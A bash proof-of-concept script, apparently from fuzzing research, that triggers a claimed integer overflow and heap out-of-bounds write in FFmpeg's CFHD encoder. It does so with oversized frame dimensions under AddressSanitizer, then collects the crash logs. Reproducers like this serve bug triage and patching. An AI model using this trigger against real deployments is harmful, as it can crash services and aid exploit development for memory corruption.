#!/bin/bash
# VULN 002 PoC: Integer Overflow in s->alpha Allocation -> Heap OOB Write
# cfhd_encode_init() in libavcodec/cfhdenc.c line 373:
#   s->alpha = av_calloc(avctx->width * avctx->height, sizeof(*s->alpha))
# With W=46336, H=46352: 46336*46352=2,147,766,272 overflows int32 to ~282624
# av_calloc under-allocates, then process_alpha() writes W*H elements -> OOB

set -uo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "=== VULN 002 PoC: CFHD alpha allocation integer overflow ==="
echo "Generating input AVI..."
python3 vuln_002_gen.py

echo ""
echo "=== Attempt 1: crafted AVI -> gbrap12le -> CFHD encoder ==="
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_002.log" \
  timeout 30 "$BIN" \
    -i vuln_002_input.avi \
    -pix_fmt gbrap12le \
    -c:v cfhd \
    -f null - 2>&1 || true

# Collect ASAN logs if any
echo ""
echo "=== ASAN log output ==="
for f in asan_002.log.*; do
    [ -f "$f" ] && cat "$f" || true
done

echo ""
echo "=== Attempt 2: lavfi color source with overflow dimensions -> gbrap12le -> CFHD ==="
# Using lavfi to directly supply a frame at the overflow dimensions
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_002b.log" \
  timeout 30 "$BIN" \
    -f lavfi -i "color=size=46336x46352:rate=1:color=black" \
    -pix_fmt gbrap12le \
    -c:v cfhd \
    -vframes 1 \
    -f null - 2>&1 || true

echo ""
echo "=== ASAN log output (attempt 2) ==="
for f in asan_002b.log.*; do
    [ -f "$f" ] && cat "$f" || true
done

echo ""
echo "=== Done ==="
